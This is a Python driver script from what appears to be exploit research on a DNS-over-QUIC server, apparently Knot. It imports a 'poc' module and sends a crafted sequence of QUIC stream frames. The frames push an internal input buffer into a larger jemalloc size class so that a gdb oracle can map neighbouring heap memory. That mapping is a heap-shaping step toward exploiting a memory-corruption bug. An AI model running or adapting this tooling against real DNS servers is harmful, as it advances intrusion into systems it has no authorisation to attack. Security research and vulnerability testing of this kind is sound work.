#!/usr/bin/env python3
"""Extended-drift oracle: how far is the next allocation after more reallocs?

F1 plus N escalation frames push pers_inbuf into a larger jemalloc size class.
F6 carries a benign body of length D.  The gdb oracle logs buf, its usable
size and the bytes at candidate neighbour offsets.
Usage: ksl_extend.py PORT N_EXTRA F6_DATALEN
"""
import asyncio
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "poc", "knot-doq"))
import poc  # noqa: E402


async def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8855
    extra = int(sys.argv[2]) if len(sys.argv) > 2 else 20
    dlen = int(sys.argv[3]) if len(sys.argv) > 3 else 1240
    cfg = poc.QuicConfiguration(is_client=True, alpn_protocols=["doq"])
    cfg.verify_mode = poc.ssl.CERT_NONE
    cfg.max_datagram_size = 1500
    cfg.idle_timeout = 20.0
    cfg.max_data = 1024 * 1024
    cfg.max_stream_data = 1024 * 1024
    print("[driver] extra=%d dlen=%d" % (extra, dlen), flush=True)
    async with poc.connect("127.0.0.1", port, configuration=cfg) as proto:
        sid = proto._quic.get_next_available_stream_id(False)
        await poc._flush(proto, sid, b"\x00\x00" + b"A" * 6, fin=False)
        for i in range(extra):
            marker = bytes((0x40 + (i % 26), 0x41 + (i % 26)))
            await poc._flush(proto, sid, marker + bytes((0x40 + j) & 0xff for j in range(1438)), fin=False)
        print("[driver] escalation done", flush=True)
        body = b"\x5A" * (dlen - 2)
        await poc._flush(proto, sid, b"\x5A\x5A" + body, fin=True)
        print("[driver] F6 fired dlen=%d" % dlen, flush=True)
        await asyncio.sleep(2.0)
    print("[driver] done", flush=True)


if __name__ == "__main__":
    asyncio.run(main())
